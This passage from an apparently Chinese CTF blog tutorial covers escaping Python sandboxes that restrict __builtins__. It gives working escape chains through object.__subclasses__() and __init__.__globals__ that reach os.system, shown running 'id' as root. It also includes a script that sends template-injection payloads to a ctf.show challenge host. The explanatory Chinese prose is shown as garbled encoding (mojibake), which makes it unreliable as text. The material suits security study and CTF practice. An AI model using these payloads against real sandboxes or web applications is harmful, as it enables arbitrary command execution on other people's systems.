...</span><br></pre></td></tr></table></figure></div>

<ol>
<li>æ²™ç®±é¦–å…ˆè·å– <code>__builtins__</code>ï¼Œç„¶åä¾æ®ç°æœ‰çš„ <code>__builtins__</code> æ¥æ„å»ºå‘½åç©ºé—´ã€‚</li>
<li>ä¿®æ”¹ <code>__import__</code> å‡½æ•°ä¸ºè‡ªå®šä¹‰çš„<code>_hook_import_</code></li>
<li>åˆ é™¤ open å‡½æ•°é˜²æ­¢æ–‡ä»¶æ“ä½œ</li>
<li>exec å‘½ä»¤ã€‚</li>
</ol>
<p>ç»•è¿‡æ–¹å¼ï¼š</p>
<p>ç”±äº exec è¿è¡Œåœ¨ç‰¹å®šçš„å‘½åç©ºé—´é‡Œï¼Œå¯ä»¥é€šè¿‡è·å–å…¶ä»–å‘½åç©ºé—´é‡Œçš„ <code>__builtins__</code>ï¼ˆè¿™ä¸ª<code>__builtins__</code>ä¿å­˜çš„å°±æ˜¯åŸå§‹<code>__builtins__</code>çš„å¼•ç”¨ï¼‰ï¼Œæ¯”å¦‚ types åº“ï¼Œæ¥æ‰§è¡Œä»»æ„å‘½ä»¤ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;types&#x27;</span>).__builtins__</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;string&#x27;</span>).__builtins__</span><br></pre></td></tr></table></figure></div>

<h2 id="å®Œå…¨é™åˆ¶"><a href="#å®Œå…¨é™åˆ¶" class="headerlink" title="å®Œå…¨é™åˆ¶"></a>å®Œå…¨é™åˆ¶</h2><p>åœ¨æŸäº› <strong>Python æ²™ç®±æ‰§è¡Œç¯å¢ƒ</strong>ä¸­ï¼Œä¸ºäº†é˜²æ­¢ç”¨æˆ·æ‰§è¡Œå±é™©æ“ä½œï¼Œä¼šé€šè¿‡ä¸‹é¢çš„æ–¹å¼æ¸…ç©º <code>__builtins__</code>ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;...&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;)</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ ·åšçš„æ•ˆæœæ˜¯ï¼š</p>
<ul>
<li>é˜»æ­¢äº†è®¿é—® <code>print</code>, <code>eval</code>, <code>open</code>, <code>__import__</code>, <code>object</code> ç­‰å†…ç½®å‡½æ•°&#x2F;ç±»ï¼›</li>
<li>å³ä½¿å†™äº† <code>&quot;__import__(&#39;os&#39;)&quot;</code>ï¼Œä¹Ÿä¼šæŠ¥é”™ï¼šå› ä¸ºä½ è®¿é—®ä¸åˆ° <code>__import__</code> å‡½æ•°äº†ã€‚</li>
</ul>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æ³¨æ„</p>

    </div>
    <div class="notel-content markdown-body">
      <p>åœ¨ Python ä¸­ï¼Œ<code>eval(expr, globals=None, locals=None)</code>ï¼ˆä»¥åŠ <code>exec</code>ï¼‰çš„å‚æ•°è§£æè§„åˆ™æ˜¯è¿™æ ·çš„ï¼š</p>
<ul>
<li><p>å¦‚æœä½ æ˜¾å¼ä¼ å…¥äº† <code>globals</code> å‚æ•°ï¼Œå¹¶ä¸”å®ƒæ˜¯ä¸€ä¸ªå­—å…¸ï¼Œä½†å…¶ä¸­<strong>æ²¡æœ‰</strong>é”® <code>__builtins__</code>ï¼Œè§£é‡Šå™¨ä¼š<strong>è‡ªåŠ¨æ’å…¥</strong>ä¸€ä»½ <code>__builtins__</code>ï¼ˆé€šå¸¸æ˜¯å¯¹å†…ç½®æ¨¡å— <code>builtins</code> çš„å¼•ç”¨ï¼‰ã€‚</p>
</li>
<li><p>å› æ­¤ï¼Œä»…ä»…å°† <code>globals</code>&#x2F;<code>locals</code> ä¼ å…¥<strong>ç©ºå­—å…¸</strong>ï¼Œå¹¶ä¸èƒ½æŠ¹æ‰å†…å»ºå‡½æ•°å’Œå¯¹è±¡ï¼›å®ƒä»¬ä¼šè¢«è‡ªåŠ¨è¡¥å›ã€‚ä¾‹å¦‚ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;len([1,2])&quot;</span>, &#123;&#125;)  <span class="comment"># âœ… æ­£å¸¸è¾“å‡º 2ï¼Œå› ä¸ºè‡ªåŠ¨è¡¥å›äº† builtins</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>å¦‚æœä½ æƒ³é˜»æ­¢è®¿é—®å†…å»ºå¯¹è±¡ï¼Œéœ€è¦<strong>æ˜¾å¼è¦†ç›–</strong> <code>__builtins__</code>ï¼Œæ¯”å¦‚ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;len([1,2])&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;)   <span class="comment"># âŒ NameError: len</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;)&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>&#125;)  <span class="comment"># âŒ NameError: __import__</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>ä½ ä¹Ÿå¯ä»¥æ”¾ä¸€ä¸ª<strong>ç™½åå• dict</strong> ä½œä¸º <code>__builtins__</code>ï¼Œåªå…è®¸æœ‰é™çš„å†…å»ºå‡½æ•°ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">safe_builtins = &#123;<span class="string">&quot;print&quot;</span>: <span class="built_in">print</span>&#125;</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;print(&#x27;ok&#x27;)&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: safe_builtins&#125;)  <span class="comment"># âœ… åªèƒ½ç”¨ print</span></span><br></pre></td></tr></table></figure></div></li>
</ul>

    </div>
  </div>

<p>ä¾‹å¦‚ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;)&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;, &#123;&#125;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;python-input-0&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;)&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;, &#123;&#125;)</span><br><span class="line">    ~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;__import__&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure></div>

<p>ç„¶è€Œä¸Šè¿°ç¤ºä¾‹ä¸­<strong>æ¸…ç©ºçš„ <code>__builtins__</code> æ˜¯â€œæ‰§è¡Œç¯å¢ƒâ€çš„ï¼Œè€Œä¸æ˜¯å‡½æ•°å®šä¹‰æ—¶ä¿å­˜çš„ç¯å¢ƒ</strong>ã€‚</p>
<p>è¿™æ˜¯å› ä¸ºä¸€ä¸ª Python å‡½æ•°å¯¹è±¡ï¼Œåœ¨å®ƒ<strong>å®šä¹‰çš„æ—¶å€™</strong>ï¼Œè§£é‡Šå™¨å°±ä¼šæŠŠå®ƒçš„å®šä¹‰ç¯å¢ƒï¼ˆå³å®ƒæ‰€åœ¨æ¨¡å—çš„ <code>globals()</code>ï¼‰ä¿å­˜è¿› <code>func.__globals__</code> é‡Œäº†ã€‚ä¹Ÿå°±æ˜¯è¯´å°±ç®—ä¹‹åä½ æ‰‹åŠ¨åˆ æ‰äº† <code>globals()[&#39;__builtins__&#39;]</code>ï¼Œè¿™ä¸ªå¼•ç”¨ä¹Ÿæ—©å°±å­˜ç€åŸæ¥çš„å†…å®¹äº†ï¼ˆæŒ‡å‘ builtins æ¨¡å—ï¼‰ã€‚</p>
<p>å› æ­¤è¿™ç§æƒ…å†µä¸‹éœ€è¦é€šè¿‡æŸç§æ–¹å¼æ‰¾å› <code>__builtins__</code>ï¼Œç„¶å<strong>é‡æ–°è·å¾—å¯¹å†…ç½®å‡½æ•°ï¼ˆå¦‚ <code>__import__</code>, <code>open</code>, <code>eval</code>, <code>os.system</code>ï¼‰çš„è®¿é—®æƒ</strong>ï¼Œä»¥ä¾¿æ‰§è¡Œå‘½ä»¤ã€è¯»å–æ–‡ä»¶ç­‰ã€‚</p>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æ³¨æ„</p>

    </div>
    <div class="notel-content markdown-body">
      <p>â€œæ¸…ç©ºâ€ <code>__builtins__</code> ä¸åˆ é™¤ <code>__builtins__</code> ä¸­çš„å‡½æ•°æ˜¯æœ‰åŒºåˆ«çš„ã€‚</p>
<ul>
<li><p>åˆ é™¤å†…å»ºæ¨¡å—ä¸­çš„åå­—æŒ‡çš„æ˜¯åœ¨<strong>å½“å‰è¿›ç¨‹å”¯ä¸€çš„ <code>builtins</code> æ¨¡å—å¯¹è±¡</strong>ä¸Šç§»é™¤ç»‘å®šã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="keyword">del</span> builtins.__dict__[<span class="string">&#x27;eval&#x27;</span>]   <span class="comment"># ç­‰ä»·äº del builtins.eval</span></span><br></pre></td></tr></table></figure></div>

<p>å‡¡æ˜¯å…¶ <code>__builtins__</code> æŒ‡å‘è¯¥æ¨¡å—ï¼ˆæˆ–å…¶ <code>__dict__</code>ï¼‰çš„å‘½åç©ºé—´ï¼Œä¹‹åå¯¹ <code>eval</code> çš„å†…å»ºæŸ¥æ‰¾å‡å¤±è´¥ï¼›<strong>å·²ä¿å­˜çš„å‡½æ•°å¼•ç”¨</strong>ï¼ˆä¾‹å¦‚ <code>saved_eval = eval</code>ï¼‰ä¸å—å½±å“ã€‚æ˜¯<strong>å…¨å±€æ€§ä¿®æ”¹</strong>ã€‚</p>
</li>
<li><p>åœ¨ <code>exec</code> ä¸­æä¾›è£å‰ªåçš„å†…å»ºæ˜ å°„ä»…å¯¹<strong>è¯¥æ¬¡æ‰§è¡Œçš„å‘½åç©ºé—´</strong>æ›´æ¢å†…å»ºæŸ¥æ‰¾åç«¯ï¼›<strong>å¹¶æœªä¿®æ”¹</strong>è¿›ç¨‹ä¸­çš„ <code>builtins</code> æ¨¡å—å¯¹è±¡ã€‚è¿™æ˜¯<strong>å±€éƒ¨æ€§éš”ç¦»</strong>ï¼›ä¸å½±å“è§£é‡Šå™¨å…¨å±€å†…å»ºæ¨¡å—çš„å†…å®¹ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(code, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;)             <span class="comment"># æˆ–è‡ªå®šä¹‰å—é™å­—å…¸</span></span><br></pre></td></tr></table></figure></div>

<p>è¯¥ä»£ç å—å†…ç›´æ¥å†™ <code>eval(...)</code> ä¼šå› æ‰¾ä¸åˆ°å†…å»ºè€Œå¤±è´¥ï¼›ä½†è‹¥ä»£ç èƒ½è·å¾—<strong>çœŸå® <code>builtins</code> æ¨¡å—å¼•ç”¨</strong>ï¼ˆå¦‚ <code>sys.modules[&#39;builtins&#39;]</code>ã€<code>print.__self__</code> ç­‰ï¼‰ï¼Œåˆ™ä»å¯è°ƒç”¨å…¶ä¸­çš„ <code>eval</code>â€”â€”<strong>å‰ææ˜¯å®ƒæ²¡æœ‰è¢«ä¸Šä¸€ç§æ–¹å¼å…¨å±€åˆ é™¤</strong>ã€‚</p>
</li>
</ul>

    </div>
  </div>

<p>Python æ˜¯é«˜åº¦<strong>è‡ªå</strong>ï¼ˆReflectiveï¼‰å’Œ<strong>åŠ¨æ€</strong>çš„è¯­è¨€ã€‚å³ä½¿ä½ åˆ æ‰äº† <code>__builtins__</code>ï¼Œç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­åˆ›å»ºçš„å¯¹è±¡ã€ç±»ã€æ¨¡å—ç­‰éƒ½ä¾ç„¶<strong>ä¿å­˜åœ¨å†…å­˜ä¸­å¹¶å¯ä»¥è¢«è®¿é—®</strong>ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡<strong>ç±»å‹ç³»ç»Ÿå’Œç»§æ‰¿ç»“æ„</strong>ï¼Œå»â€œç¿»â€åˆ°è¿™äº›å¯¹è±¡ã€‚</p>
<h3 id="è·å–-object-ç±»"><a href="#è·å–-object-ç±»" class="headerlink" title="è·å– object ç±»"></a>è·å– object ç±»</h3><p>Python ä¸­æ‰€æœ‰å¯¹è±¡çš„åŸºç±»æ˜¯ <code>object</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬ä»ä»»æ„å¯¹è±¡å‡ºå‘ï¼Œæ‹¿åˆ° <code>object</code>ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<h3 id="è·å–-object-çš„å¯ç”¨å­ç±»"><a href="#è·å–-object-çš„å¯ç”¨å­ç±»" class="headerlink" title="è·å– object çš„å¯ç”¨å­ç±»"></a>è·å– object çš„å¯ç”¨å­ç±»</h3><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ç±»çš„ <code>__subclasses__</code> æ–¹æ³•è·å– <code>object</code> çš„æ‰€æœ‰å­ç±»ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">object</span>.__subclasses__()</span><br><span class="line">[&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;async_generator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytearray_iterator&#x27;</span>&gt;, ...]</span><br></pre></td></tr></table></figure></div>

<p>è¿™å°±æ˜¯å†…å­˜ä¸­ç°å­˜çš„ç±»å¯¹è±¡ã€‚æˆ‘ä»¬å°±å¯ä»¥åœ¨è¿™äº›å­ç±»ä¸­å¯»æ‰¾ä¸€ä¸ªæœ‰æ²¡æœ‰é‡è½½è¿‡ <code>__init__</code> çš„ç±»ï¼Œä»¥ä¾¿é€šè¿‡ <code>__init__.__globals__</code> æ‰¾åˆ° <code>os</code> æˆ– <code>builtins</code> æ¨¡å—ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">l = <span class="built_in">len</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;wrapper&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[i].__init__):</span><br><span class="line">        <span class="built_in">print</span> (i, <span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[i])</span><br></pre></td></tr></table></figure></div>

<p>å¯¹äºè¿œç¨‹ç¯å¢ƒï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¾ªç¯å‘åŒ…è¯·æ±‚æ¥æ¢æµ‹å¯ç”¨ç±»åœ¨ <code>object.__subclasses__()</code> ä¸­çš„ä¸‹æ ‡ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¦ç”¨ SSL éªŒè¯è­¦å‘Š</span></span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&quot;https://14fba753-0bb4-47e2-bc11-9341f5e11d10.challenge.ctf.show&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">probe_index</span>(<span class="params">index</span>):</span><br><span class="line">    payload = quote(<span class="string">f&quot;&#123;&#123;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[<span class="subst">&#123;index&#125;</span>].__init__&#125;&#125;&#125;&#125;&quot;</span>)</span><br><span class="line">    url = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/?name=<span class="subst">&#123;payload&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = requests.get(url, timeout=<span class="number">3</span>, verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="built_in">print</span>(resp.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] Found subclass at index <span class="subst">&#123;index&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    --&gt; <span class="subst">&#123;resp.text.strip()[:<span class="number">200</span>]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Error on index <span class="subst">&#123;index&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">        probe_index(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>

<h3 id="globals-ä¸­çš„å¯ç”¨æ¨¡å—"><a href="#globals-ä¸­çš„å¯ç”¨æ¨¡å—" class="headerlink" title="globals ä¸­çš„å¯ç”¨æ¨¡å—"></a>globals ä¸­çš„å¯ç”¨æ¨¡å—</h3><p>Python <strong>å‡½æ•°å¯¹è±¡</strong>æœ‰ <code>__globals__</code> å±æ€§ï¼Œä¿å­˜äº†å‡½æ•°å®šä¹‰æ‰€åœ¨æ¨¡å—çš„<strong>å…¨å±€å‘½åç©ºé—´</strong>ã€‚å†…ç½®æ¨¡å—ï¼ˆ<code>builtins</code>ï¼‰æˆ–å¯¼å…¥çš„æ¨¡å—ï¼ˆå¦‚ <code>os</code>ï¼Œ<code>sys</code>ï¼‰å¸¸å¸¸åœ¨é‡Œé¢ã€‚</p>
<h4 id="builtins-æ¨¡å—-1"><a href="#builtins-æ¨¡å—-1" class="headerlink" title="builtins æ¨¡å—"></a>builtins æ¨¡å—</h4><p>ä¾‹å¦‚ <code>warnings.catch_warnings</code> æ¨¡å—çš„å…¨å±€å‘½åç©ºé—´ä¸­æœ‰ <code>__builtins__</code> æ¨¡å—ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å·²ç»æ‰¾å› <code>__builtins__</code> æ¨¡å—ï¼Œå¯ä»¥ï¼š</p>
<ul>
<li>ä½¿ç”¨è¯¥æ¨¡å—çš„ <code>__import__</code> å‡½æ•°å¯¼å…¥ <code>os</code> æ¨¡å—æ¥æ‰§è¡Œå‘½ä»¤ï¼›</li>
<li>æˆ–è€…é€šè¿‡è¯¥æ¨¡å—çš„ <code>eval</code> å‡½æ•°ç›´æ¥æ‰§è¡Œ python è„šæœ¬ã€‚</li>
</ul>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">144</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">144</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">144</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;id&quot;)&#x27;</span>)</span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æ³¨æ„</p>

    </div>
    <div class="notel-content markdown-body">
      <p>è¿™é‡Œé€šè¿‡ <code>__init__.__globals__</code> æ‰¾åˆ°çš„å¹¶ä¸æ˜¯çœŸæ­£çš„ <code>__builtins__</code> æ¨¡å—ï¼Œè€Œæ˜¯<strong>å­—å…¸å½¢å¼çš„ <code>builtins</code> å‘½åç©ºé—´å¿«ç…§</strong>ï¼Œä¹Ÿå°±æ˜¯ <code>__builtins__.__dict__</code>ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(<span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">144</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>])</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(__builtins__)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;module&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆé€šè¿‡ <code>__init__.__globals__</code> æ‰¾åˆ°çš„â€œ<code>__builtins__</code> æ¨¡å—â€å¯ä»¥ç›´æ¥é€šè¿‡å­—å…¸çš„å½¢å¼è®¿é—®æ¨¡å—ä¸­çš„å‡½æ•°ï¼Œè€ŒçœŸæ­£çš„ <code>__builtins__</code> æ¨¡å—éœ€è¦é€šè¿‡ <code>__dict__</code> å±æ€§æˆ–è€…ç›´æ¥å±æ€§è®¿é—®ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">144</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: <span class="string">&#x27;module&#x27;</span> <span class="built_in">object</span> <span class="keyword">is</span> <span class="keyword">not</span> subscriptable</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.<span class="built_in">eval</span></span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br></pre></td></tr></table></figure></div>

<p>ä¸è¿‡ä¸¤è€…æœ¬è´¨ä¸Šéƒ½æ˜¯ <code>builtins</code> æ¨¡å—ï¼Œå› ä¸º Python çš„æ¨¡å—æ˜¯å•ä¾‹æ¨¡å¼åŠ è½½çš„ï¼Œåªæœ‰ä¸€ä¸ªã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, builtins</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»»æ„æ‹¿åˆ°ä¸¤å¤„ __builtins__ï¼šb1 å¯èƒ½æ˜¯æ¨¡å—ï¼Œb2 å¯èƒ½æ˜¯å­—å…¸</span></span><br><span class="line">b1 = (<span class="keyword">lambda</span>: <span class="literal">None</span>).__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]</span><br><span class="line">b2 = 